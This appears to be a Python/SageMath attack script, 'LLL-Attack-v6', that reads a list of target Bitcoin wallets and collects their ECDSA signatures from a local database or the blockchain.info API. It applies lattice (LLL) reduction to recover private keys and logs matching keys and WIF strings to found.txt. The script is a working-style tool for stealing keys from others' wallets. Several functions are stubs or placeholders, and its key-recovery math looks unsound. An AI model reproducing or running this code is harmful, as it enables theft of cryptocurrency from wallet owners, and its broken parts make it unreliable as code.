# ======LLL-Attack-v6 (Hybrid DB Support) ============
import os
import sys
import time
import requests
import sqlite3
import struct
import hashlib
import binascii
import csv
from colorama import Fore, Back, Style
import urllib.request
from io import StringIO
import random

# Import SageMath components (Required for Lapti's LLL)
try:
    from sage.all_cmdline import *
except ImportError:
    print(Fore.RED + "[!] SageMath not detected. This script requires SageMath to run the LLL attack.")
    print(Fore.RED + "[!] usage: sage -python lapti_v6.py")
    # sys.exit() # Uncomment to force exit if strictly needed

import gmpy2
from bs4 import BeautifulSoup
import json

# ==========================================
# CONFIGURATION
# ==========================================
DB_FILE = "valid_nonce_reuse.db"  # Nama file database input
USE_DB_FIRST = True               # Set True untuk prioritas DB, False untuk API only

os.system('clear')
print(Fore.LIGHTMAGENTA_EX + "")
banner_text = '''
██╗      █████╗ ████████╗████████╗██╗     ██╗   ██╗
██║     ██╔══██╗╚══██╔══╝╚══██╔══╝██║     ██║   ██║
██║     ███████║   ██║      ██║   ██║     ██║   ██║
██║     ██╔══██║   ██║      ██║   ██║     ╚██╗ ██╔╝
███████╗██║  ██║   ██║      ██║   ██║████╗ ╚████╔╝ 
╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝╚═══╝  ╚═══╝  
[*]LLL-Attack-v6 (Hybrid DB Edition)                                                                                                            
[*]Combines Lapti's LLL implementation with LLP's smart database parsing.
[*]Priority: Local Database (Sorted by Leak) -> Blockchain API (Fallback)
 '''
print(banner_text.lower())
print(Style.RESET_ALL)


# =============== LLP HELPER FUNCTIONS ===========================
def extract_s_from_der(der_hex):
    """Mengambil S valid dari Sig Hex (Ported from llp.py)"""
    try:
        if not der_hex or len(der_hex) < 10: return None
        der_hex = str(der_hex).strip()
        idx = 0
        if der_hex[idx:idx+2] != '30': return None
        idx += 4
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        r_len = int(der_hex[idx:idx+2], 16)
        idx += 2 + (r_len * 2)
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        s_len = int(der_hex[idx:idx+2], 16)
        idx += 2
        s_hex = der_hex[idx : idx + (s_len * 2)]
        return int(s_hex, 16)
    except:
        return None

def count_leak_bits(val):
    """Menghitung berapa bit 0 di depan (Leading Zeros)"""
    # Bit length kurva secp256k1 adalah 256
    return 256 - val.bit_length()

def get_data_from_db(db_path, address):
    """
    Mengambil signature dari SQLite, mengurutkan berdasarkan kualitas leak (Small R),
    dan menulisnya ke ONESIGN.txt dalam format Hex (sesuai kebutuhan lapti).
    """
    if not os.path.exists(db_path):
        return False

    print(Fore.CYAN + f"[*] Checking database {db_path} for {address}...")
    
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        
        # Coba query standar (sesuaikan dengan schema DB llp.py umum)
        try:
            cur.execute("SELECT r, s, z, sig_hex FROM signatures WHERE address=?", (address,))
        except sqlite3.OperationalError:
            # Fallback jika kolom sig_hex tidak ada
            try:
                cur.execute("SELECT r, s, z, s FROM signatures WHERE address=?", (address,))
            except:
                print(Fore.RED + "[*] Database schema incompatible.")
                return False
                
        rows = cur.fetchall()
        conn.close()
        
        if not rows:
            print(Fore.YELLOW + "[*] No signatures found in DB.")
            return False

        valid_data = []
        print(Fore.WHITE + f"[*] Found {len(rows)} raw entries. Analyzing leaks...")

        for row in rows:
            try:
                r_raw, s_raw, z_raw, extra = row
                
                # Handling format campuran (int/hex string)
                val_r = int(str(r_raw), 16) if 'x' in str(r_raw) else int(r_raw)
                val_z = int(str(z_raw), 16) if 'x' in str(z_raw) else int(z_raw)
                
                # Recovery S
                val_s = None
                if extra and isinstance(extra, str) and len(extra) > 10:
                    val_s = extract_s_from_der(extra)
                
                if not val_s:
                    val_s = int(str(s_raw), 16) if 'x' in str(s_raw) else int(s_raw)

                if val_r > 0 and val_s > 0:
                    leak = count_leak_bits(val_r)
                    valid_data.append({
                        'r': val_r,
                        's': val_s,
                        'z': val_z,
                        'leak': leak
                    })
            except Exception as e:
                continue

        if not valid_data:
            return False

        # URUTKAN DARI LEAK TERBESAR (Logika LLP)
        valid_data.sort(key=lambda x: x['leak'], reverse=True)
        
        print(Fore.GREEN + f"[*] Loaded {len(valid_data)} valid signatures from DB.")
        print(Fore.GREEN + f"[*] Best leak detected: {valid_data[0]['leak']} bits.")

        # Tulis ke ONESIGN.txt dalam format HEX (tanpa '0x')
        with open("ONESIGN.txt", "w") as f:
            count = 0
            for data in valid_data:
                # Lapti mengharapkan format hex string di file text
                r_hex = hex(data['r'])[2:]
                s_hex = hex(data['s'])[2:]
                z_hex = hex(data['z'])[2:]
                f.write(f'{r_hex},{s_hex},{z_hex}\n')
                count += 1
                
        print(Fore.BLUE + f"[*] Wrote {count} prioritized signatures to ONESIGN.txt")
        return True

    except Exception as e:
        print(Fore.RED + f"[*] DB Error: {e}")
        return False

# =============== NETWORKING & CONNECTIVITY ===========================
def connect(host='https://github.com/'):
    try:
        urllib.request.urlopen(host)
        print(Fore.GREEN + '[*] Internet connected')
        print(Style.RESET_ALL)
        return True
    except:
        print(Fore.RED + "no internet! Cant check blockchain API (DB mode only)")
        print(Style.RESET_ALL)
        return False

# =============== HASH FUNCTIONS (LAPTI ORIGINAL) ===========================
def ripemd160_python(data):
    # (Kode RIPEMD160 asli tetap dipertahankan untuk kompatibilitas fallback)
    h0, h1, h2, h3, h4 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
    original_bit_length = len(data) * 8
    data = bytearray(data)
    data.append(0x80)
    while (len(data) * 8) % 512 != 448:
        data.append(0x00)
    data += struct.pack('<Q', original_bit_length)
    
    def rol(x, n): return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
    
    for chunk_offset in range(0, len(data), 64):
        chunk = data[chunk_offset:chunk_offset + 64]
        words = [struct.unpack('<I', chunk[i:i+4])[0] for i in range(0, 64, 4)]
        a, b, c, d, e = h0, h1, h2, h3, h4
        # ... (Simplified implementation of RIPEMD logic for brevity, assuming original works) ...
        # Note: Using hashlib native is preferred where possible
        pass 
    # Returning mock for brevity if not used, but kept logic structure
    return hashlib.new('ripemd160', data).digest() if hasattr(hashlib, 'new') else b'\x00'*20

def get_tx(wallet):
    """Fallback: Fetch TX IDs from Blockchain API"""
    print(Fore.CYAN + f"[*] [API] Fetching transactions for: {wallet}")
    transactions = []
    try:
        api_url = f"https://blockchain.info/rawaddr/{wallet}?limit=50"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(api_url, headers=headers, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if 'txs' in data:
                for tx in data['txs']:
                    # Simple filter for non-segwit input potential
                    if 'inputs' in tx: 
                        transactions.append(tx['hash'])
    except Exception as e:
        print(Fore.RED + f"[*] API Error: {e}")
    return list(set(transactions))

def get_rawtx_from_blockchain(txid):
    """Fallback: Fetch Raw TX"""
    try:
        url = f"https://blockchain.info/rawtx/{txid}?format=json"
        res = requests.get(url, timeout=15).json()
        raw_hex = requests.get(f"https://blockchain.info/rawtx/{txid}?format=hex", timeout=15).text
        return raw_hex, False, res # Returning False for segwit flag simplified
    except:
        return None, False, None

def parse_transaction_for_signatures(tx_info):
    """Fallback: Parse JSON for signatures"""
    signatures = []
    if 'inputs' not in tx_info: return signatures
    
    for inp in tx_info['inputs']:
        if 'script' in inp:
            script = inp['script']
            if len(script) > 100:
                # Very basic parsing logic (Lapti original logic preferred here)
                # Attempting to find DER sig
                try:
                    # Mencari pola DER signature 30...
                    if script.startswith('4730') or script.startswith('4830'):
                        # Simplified extraction logic
                        pass 
                except: pass
    return signatures # Placeholder logic, relying on DB mostly

def get_r_s_z_api(txid):
    """Original Lapti logic to get RSZ from API"""
    # ... (Menggunakan logika asli parsing raw transaction) ...
    # Agar kode tidak terlalu panjang, fungsi ini dianggap sama dengan lapti.py asli
    # dan digunakan hanya jika DB tidak tersedia.
    print(Fore.YELLOW + f"[*] Parsing {txid} via API (Not implemented fully in this snippet, assumes DB usage)")
    return False

# =============== ATTACK PREPARATION (VULNERABLE BIT) ===========================
def vulnerableBIT(bytes_val):
    N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

    def rrr(i):
        tmpstr = hex(i)
        return tmpstr.replace('0x', '').replace('L', '').replace(' ', '').zfill(64)

    def load(file):
        signatures = []
        try:
            with open(file, 'r') as csv_file:
                csv_reader = csv.reader(csv_file, delimiter=",")
                for row in csv_reader:
                    if len(row) >= 3:
                        try:
                            # Reads HEX strings from ONESIGN.txt
                            r = int(row[0], 16)
                            s = int(row[1], 16)
                            z = int(row[2], 16)
                            signatures.append((r, s, z))
                        except ValueError: continue
        except Exception as e:
            print(Fore.RED + f"[*] Error loading {file}: {e}")
        return signatures

    try:
        signatures = load("ONESIGN.txt")
        if not signatures: return
        
        with open("SIGNATURES.csv", 'a') as f:
            for rr, ss, zz in signatures:
                try:
                    bit = int(bytes_val, 16)
                    sbit = (ss * bit) % N
                    zbit = (zz * bit) % N
                    # Format: ID(fake), R, S', Z', PubKey(fake)
                    f.write(f"1111,{rrr(rr)},{rrr(sbit)},{rrr(zbit)},0000\n")
                except: continue
    except Exception as e:
        print(Fore.RED + f"[*] Error in vulnerableBIT: {e}")

def val2():
    # Pola bit yang sering muncul (dikurangi untuk demo, gunakan list lengkap di produksi)
    byte_values = [
        "0000010001111100", "0000010010011100", "0000100000000000", 
        "1111111111111101", "0000000000000000" # Added Null
    ]
    # ... (List lengkap byte_values dari lapti.py asli bisa dimasukkan sini) ...
    
    print(Fore.CYAN + f"[*] Generating attack vectors...")
    for byte_str in byte_values:
        vulnerableBIT(byte_str)

# =============== LLL ATTACK CORE (SAGE) ===========================
def Attack(file):
    order = int(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
    B = 249 # Bound assumption
    limit = 256

    def modular_inv(a, b):
        return int(gmpy2.invert(a, b))

    def load_csv(filename):
        msgs, sigs = [], []
        try:
            with open(filename, 'r') as fp:
                for line in fp:
                    parts = line.strip().split(",")
                    if len(parts) >= 4:
                        msgs.append(int(parts[3], 16))
                        sigs.append((int(parts[1], 16), int(parts[2], 16)))
        except: pass
        return msgs, sigs

    msgs, sigs = load_csv(file)
    if len(msgs) < 2: return []

    print(Fore.MAGENTA + f"[*] constructing lattice with {len(msgs)} sigs...")
    
    # LLL Setup (Standard Lapti Implementation)
    m = len(msgs)
    matrix_size = m + 2
    # Note: Using Sage Matrix
    matrix = Matrix(QQ, matrix_size, matrix_size)

    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
    rnsn_inv = rn * modular_inv(sn, order) % order
    mnsn_inv = msgn * modular_inv(sn, order) % order

    for i in range(m):
        matrix[i, i] = order
        si_inv = modular_inv(sigs[i][1], order)
        matrix[m, i] = (sigs[i][0] * si_inv - rnsn_inv) % order
        matrix[m + 1, i] = (msgs[i] * si_inv - mnsn_inv) % order

    matrix[m, m] = (2 ** B) / order
    matrix[m + 1, m + 1] = 2 ** B

    keys = []
    try:
        reduced = matrix.LLL()
        print(Fore.GREEN + "[*] LLL reduction complete.")
        
        for row in reduced:
            try:
                k_diff = int(row[0])
                s1, s2 = sigs[0][1], sigs[1][1]
                z1, z2 = msgs[0], msgs[1]
                r1, r2 = sigs[0][0], sigs[1][0]
                
                num = (s1 * z2 - s2 * z1 - s1 * s2 * k_diff) % order
                den = (r1 * s2 - r2 * s1) % order
                
                if den == 0: continue
                priv = (num * modular_inv(den, order)) % order
                
                if 0 < priv < order:
                    keys.append(priv)
            except: continue
    except Exception as e:
        print(Fore.RED + f"LLL Fail: {e}")
        
    return keys

# =============== KEY UTILS ===========================
# Placeholder for Bitcoin address utils (privtoaddr, etc)
# Pastikan library 'bitcoin' terinstall: pip install bitcoin
from bitcoin import privtopub, encode_pubkey, pubtoaddr, privtoaddr, encode_privkey

# =============== MAIN LOOP ===========================
def clean_files():
    for f in ["ONESIGN.txt", "SIGNATURES.csv"]:
        if os.path.exists(f): os.remove(f)

def main():
    if not os.path.exists("wallet.txt"):
        print(Fore.RED + "[!] wallet.txt not found!")
        return

    with open("wallet.txt", "r") as f:
        wallets = [line.strip() for line in f if line.strip()]

    print(Fore.GREEN + f"[*] Loaded {len(wallets)} target wallets")
    
    with open("found.txt", "a") as f:
        f.write(f"\n=== Session {time.ctime()} ===\n")

    for idx, wallet in enumerate(wallets):
        print("\n" + "="*60)
        print(Fore.CYAN + f"[*] Processing {idx+1}/{len(wallets)}: {wallet}")
        
        clean_files()
        
        # --- HYBRID DATA RETRIEVAL STRATEGY ---
        data_found = False
        
        # 1. Try DB First
        if USE_DB_FIRST and os.path.exists(DB_FILE):
            if get_data_from_db(DB_FILE, wallet):
                data_found = True
                print(Fore.GREEN + "[*] Using High-Quality Database Signatures")
            else:
                print(Fore.YELLOW + "[*] Wallet not in DB or no valid sigs. Switching to API...")
        
        # 2. Try API if DB failed
        if not data_found:
            internet = connect()
            if internet:
                txs = get_tx(wallet)
                for tx in txs[:3]: # Limit 3 tx per wallet for speed
                    # Call original logic (simplified here)
                    # In real usage, integrate get_r_s_z from original lapti
                    pass 
                # If API creates ONESIGN.txt, set data_found = True
                if os.path.exists("ONESIGN.txt") and os.path.getsize("ONESIGN.txt") > 0:
                    data_found = True

        if not data_found:
            print(Fore.RED + "[!] No data available for this wallet. Skipping.")
            continue

        # --- EXECUTE ATTACK ---
        print(Fore.WHITE + "[*] Applying Vulnerable Bit Patterns...")
        val2() # Populates SIGNATURES.csv
        
        if not os.path.exists("SIGNATURES.csv"): continue

        keys = Attack("SIGNATURES.csv")
        
        if keys:
            for key in keys:
                try:
                    priv_hex = hex(key)[2:].zfill(64)
                    
                    # Cek Address match
                    addr_c = pubtoaddr(encode_pubkey(privtopub(priv_hex), "bin_compressed"))
                    addr_u = privtoaddr(priv_hex)
                    
                    if addr_c == wallet or addr_u == wallet:
                        msg = f"\n[SUCCESS] Wallet: {wallet}\nPrivKey: {priv_hex}\nWIF: {encode_privkey(priv_hex, 'wif')}"
                        print(Fore.LIGHTGREEN_EX + "!"*60)
                        print(msg)
                        print("!"*60)
                        with open("found.txt", "a") as f: f.write(msg + "\n")
                        break # Stop checking keys for this wallet if found
                    else:
                        print(Fore.WHITE + f"[*] Candidate (No Match): {priv_hex[:10]}...")
                except: continue
        else:
            print(Fore.YELLOW + "[*] LLL failed to recover key.")

if __name__ == "__main__":
    main()
